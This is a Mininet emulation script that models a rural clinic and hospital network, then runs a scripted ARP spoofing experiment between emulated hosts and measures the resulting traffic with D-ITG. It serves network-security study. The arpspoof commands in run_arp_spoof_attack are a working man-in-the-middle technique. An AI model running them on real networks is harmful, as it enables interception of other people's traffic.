#!/usr/bin/env python
"""
ARP Spoofing Attack on the Rural LAN topology
Victim: rH1 (10.10.10.2)
Normal user: rH2 (10.10.10.3)
Attacker: rH3 (10.10.10.4)
"""

import time
import argparse
from mininet.net import Mininet
from mininet.node import Controller, RemoteController, OVSController
from mininet.node import CPULimitedHost, Host, Node
from mininet.node import OVSKernelSwitch, UserSwitch
from mininet.node import IVSSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink, Intf
from subprocess import call
from mininet.link import TCIntf

TCIntf.bwParamMax = 100000

class LinuxRouter(Node):
    def config(self, **params):
        super().config(**params)
        self.cmd('sysctl -w net.ipv4.ip_forward=1')

    def terminate(self):
        self.cmd('sysctl -w net.ipv4.ip_forward=0')
        super().terminate()

def parse_args():
    p = argparse.ArgumentParser(description="Rural <-> Hospital Mininet Topology")
    # ... (keep all your existing arguments) ...
    p.add_argument("--rwan-bw", type=float, default=0.1, help="Rural WAN bandwidth (Gbps)")
    p.add_argument("--rwan-delay", default="50ms", help="Rural WAN latency (50ms)")
    p.add_argument("--rwan-jitter", default="20ms", help="Rural WAN jitter (20ms)")
    p.add_argument("--rwan-loss", type=float, default=1.0, help="Rural WAN packet loss (%%)")

    p.add_argument("--uwan-bw", type=float, default=5, help="Urban WAN bandwidth (Gbps)")
    p.add_argument("--uwan-delay", default="20ms", help="Urban WAN latency (20ms)")
    p.add_argument("--uwan-jitter", default="5ms", help="Urban WAN jitter (5ms)")
    p.add_argument("--uwan-loss", type=float, default=0.1, help="Urban WAN packet loss (%%)")

    p.add_argument("--rlan-bw", type=float, default=5, help="Rural LAN bandwidth (Gbps)")
    p.add_argument("--rlan-delay", default="3ms", help="Rural LAN latency (3ms)")
    p.add_argument("--rlan-jitter", default="3ms", help="Rural LAN jitter (3ms)")
    p.add_argument("--rlan-loss", type=float, default=0.3, help="Rural LAN packet loss (%)")

    p.add_argument("--ulan-bw", type=float, default=20, help="Urban LAN bandwidth (Gbps)")
    p.add_argument("--ulan-delay", default="2ms", help="Urban LAN latency (2ms)")
    p.add_argument("--ulan-jitter", default="1ms", help="Urban LAN jitter (1ms)")
    p.add_argument("--ulan-loss", type=float, default=0.01, help="Urban LAN packet loss (%)")

    args = p.parse_args()
    # convert Gbps to Mbps for Mininet
    args.rwan_bw = args.rwan_bw * 1000.0
    args.uwan_bw = args.uwan_bw * 1000.0
    args.rlan_bw = args.rlan_bw * 1000.0
    args.ulan_bw = args.ulan_bw * 1000.0
    return args

def run_arp_spoof_attack(net):
    """
    Performs ARP spoofing on the rural LAN:
    - victim: rH1 (10.10.10.2)
    - normal user: rH2 (10.10.10.3)
    - attacker: rH3 (10.10.10.4)
    """
    # Get the hosts
    victim = net.get('rH1')
    user   = net.get('rH2')
    attacker = net.get('rH3')

    print("\n--- ARP Spoofing Attack on Rural LAN ---")
    print(f"Victim: rH1 ({victim.IP()})")
    print(f"Normal user: rH2 ({user.IP()})")
    print(f"Attacker: rH3 ({attacker.IP()})")

    # 1. Start D-ITG receiver on victim
    victim.cmd('/usr/bin/ITGRecv &')
    print("[*] ITGRecv started on rH1 (victim)")

    # 2. Configure attacker for ARP spoofing
    attacker.cmd('sysctl -w net.ipv4.ip_forward=1')
    # arpspoof requires the interface name – find it (should be rH3-eth0)
    attacker_iface = attacker.defaultIntf().name
    attacker.cmd(f'arpspoof -i {attacker_iface} -t {victim.IP()} {user.IP()} > /dev/null 2>&1 &')
    attacker.cmd(f'arpspoof -i {attacker_iface} -t {user.IP()} {victim.IP()} > /dev/null 2>&1 &')
    print("[*] ARP spoofing started on rH3 (attacker)")

    # 3. Start D-ITG traffic from normal user to victim
    # UDP: 1000 packets/s, 512 bytes each, duration 10 seconds
    user.cmd(f'/usr/bin/ITGSend -a {victim.IP()} -T UDP -C 1000 -c 512 -t 10000 -l traffic.dat &')
    print("[*] ITGSend started on rH2 -> rH1 (UDP flood)")

    # Wait for traffic to finish
    print("[~] Waiting 12 seconds for traffic to complete...")
    time.sleep(12)

    # 4. Stop the attack
    attacker.cmd('killall arpspoof')
    attacker.cmd('sysctl -w net.ipv4.ip_forward=0')
    victim.cmd('killall ITGRecv')
    user.cmd('killall ITGSend')
    print("[*] Attack stopped, processes terminated.")

    # 5. Decode the D-ITG log on the user host
    decode_cmd = '/usr/bin/ITGDec traffic.dat 2>&1'
    report = user.cmd(decode_cmd)
    user.cmd('rm -f traffic.dat')

    # Print the report
    print("\n--- D-ITG Report ---")
    print(report)

    # Also save to a file
    with open('attack_results.txt', 'w') as f:
        f.write(report)
    print("[+] Report saved to 'attack_results.txt'")

def myNetwork():
    args = parse_args()
    net = Mininet( topo=None,
                   build=False,
                   ipBase='10.0.0.0/8')

    info( '*** Adding controller\n')
    c0=net.addController(name='c0',
                      controller=Controller,
                      protocol='tcp',
                      port=6633)

    info( '*** Add switches\n')
    s1 = net.addSwitch('s1', cls=OVSKernelSwitch, failMode='standalone') #internet
    s2 = net.addSwitch('s2', cls=OVSKernelSwitch, failMode='standalone') #R-Lan
    s3 = net.addSwitch('s3', cls=OVSKernelSwitch, failMode='standalone') #admin
    s4 = net.addSwitch('s4', cls=OVSKernelSwitch, failMode='standalone') #clinic
    s5 = net.addSwitch('s5', cls=OVSKernelSwitch, failMode='standalone') #IoT

    info( '*** Add hosts\n')
    rR = net.addHost('rR', cls=LinuxRouter, ip='0.0.0.0')
    uR = net.addHost('uR', cls=LinuxRouter, ip='0.0.0.0')
    h3 = net.addHost('rH1', cls=Host, ip='10.10.10.2/24', defaultRoute='via 10.10.10.1')
    h4 = net.addHost('rH2', cls=Host, ip='10.10.10.3/24', defaultRoute='via 10.10.10.1')
    h5 = net.addHost('rH3', cls=Host, ip='10.10.10.4/24', defaultRoute='via 10.10.10.1')
    h6 = net.addHost('rH4', cls=Host, ip='10.10.10.5/24', defaultRoute='via 10.10.10.1')
    h7 = net.addHost('aH1', cls=Host, ip='10.20.10.2/24', defaultRoute='via 10.20.10.1')
    h8 = net.addHost('aH2', cls=Host, ip='10.20.10.3/24', defaultRoute='via 10.20.10.1')
    h9 = net.addHost('aH3', cls=Host, ip='10.20.10.4/24', defaultRoute='via 10.20.10.1')
    h10 = net.addHost('cH1', cls=Host, ip='10.20.20.2/24', defaultRoute='via 10.20.20.1')
    h11 = net.addHost('cH2', cls=Host, ip='10.20.20.3/24', defaultRoute='via 10.20.20.1')
    h12 = net.addHost('cH3', cls=Host, ip='10.20.20.4/24', defaultRoute='via 10.20.20.1')
    h13 = net.addHost('iH1', cls=Host, ip='10.20.30.2/24', defaultRoute='via 10.20.30.1')
    h14 = net.addHost('iH2', cls=Host, ip='10.20.30.3/24', defaultRoute='via 10.20.30.1')
    h15 = net.addHost('iH3', cls=Host, ip='10.20.30.4/24', defaultRoute='via 10.20.30.1')

    # ... (all links as in your original code) ...
    info( '*** Add links\n')
    # r router to internet
    net.addLink(rR, s1, cls=TCLink,
                bw=args.rwan_bw,
                delay=args.rwan_delay,
                jitter=args.rwan_jitter,
                loss=args.rwan_loss)
    # u router to internet
    net.addLink(s1, uR, cls=TCLink,
                bw=args.uwan_bw,
                delay=args.uwan_delay,
                jitter=args.uwan_jitter,
                loss=args.uwan_loss)
    # r router to rLAN
    net.addLink(rR, s2, cls=TCLink,
                bw=args.rlan_bw,
                delay=args.rlan_delay,
                jitter=args.rlan_jitter,
                loss=args.rlan_loss)
    # rLAN to H1
    net.addLink(s2, h3, cls=TCLink,
                bw=args.rlan_bw,
                delay=args.rlan_delay,
                jitter=args.rlan_jitter,
                loss=args.rlan_loss)
    # rLAN to H2
    net.addLink(s2, h4, cls=TCLink,
                bw=args.rlan_bw,
                delay=args.rlan_delay,
                jitter=args.rlan_jitter,
                loss=args.rlan_loss)
    # rLAN to H3
    net.addLink(s2, h5, cls=TCLink,
                bw=args.rlan_bw,
                delay=args.rlan_delay,
                jitter=args.rlan_jitter,
                loss=args.rlan_loss)
    # rLAN to H4
    net.addLink(s2, h6, cls=TCLink,
                bw=args.rlan_bw,
                delay=args.rlan_delay,
                jitter=args.rlan_jitter,
                loss=args.rlan_loss)

    # U router to Admin
    net.addLink(uR, s3, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # U router to Clinic
    net.addLink(uR, s4, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # u router to IoT
    net.addLink(uR, s5, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)

    # Admin to H1
    net.addLink(s3, h7, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # Admin to H2
    net.addLink(s3, h8, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # Admin to H3
    net.addLink(s3, h9, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)

    # Clinic to H1
    net.addLink(s4, h10, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # Clinic to H2
    net.addLink(s4, h11, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # Clinic to H3
    net.addLink(s4, h12, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)

    # IoT to H1
    net.addLink(s5, h13, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # IoT to H2
    net.addLink(s5, h14, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)
    # IoT to H3
    net.addLink(s5, h15, cls=TCLink,
                bw=args.ulan_bw,
                delay=args.ulan_delay,
                jitter=args.ulan_jitter,
                loss=args.ulan_loss)

    info( '*** Starting network\n')
    net.build()
    info( '*** Starting controllers\n')
    for controller in net.controllers:
        controller.start()

    info( '*** Starting switches\n')
    net.get('s1').start([]) #Internet
    net.get('s2').start([]) #RLan
    net.get('s3').start([]) #Admin
    net.get('s4').start([]) #Clinic
    net.get('s5').start([]) #IoT

    info('** Configuring router interfaces\n')
    rR.cmd("ip addr flush dev rR-eth0")
    rR.cmd("ip addr flush dev rR-eth1")
    rR.cmd("ip addr add 198.162.10.10/24 dev rR-eth0")
    rR.cmd("ip addr add 10.10.10.1/24 dev rR-eth1")
    rR.cmd("ip route add 10.20.10.0/24 via 198.162.10.20")
    rR.cmd("ip route add 10.20.20.0/24 via 198.162.10.20")
    rR.cmd("ip route add 10.20.30.0/24 via 198.162.10.20")

    uR.cmd("ip addr flush dev uR-eth0")
    uR.cmd("ip addr flush dev uR-eth1")
    uR.cmd("ip addr flush dev uR-eth2")
    uR.cmd("ip addr flush dev uR-eth3")
    uR.cmd("ip addr add 198.162.10.20/24 dev uR-eth0")
    uR.cmd("ip addr add 10.20.10.1/24 dev uR-eth1")
    uR.cmd("ip addr add 10.20.20.1/24 dev uR-eth2")
    uR.cmd("ip addr add 10.20.30.1/24 dev uR-eth3")
    uR.cmd("ip route add 10.10.10.0/24 via 198.162.10.10")

    info( '*** Post configure switches and hosts\n')

    # ----- Run the ARP spoofing attack on the rural LAN -----
    run_arp_spoof_attack(net)

    # After the attack, start the Mininet CLI for further inspection
    info( '*** Starting Mininet CLI\n')
    CLI(net)
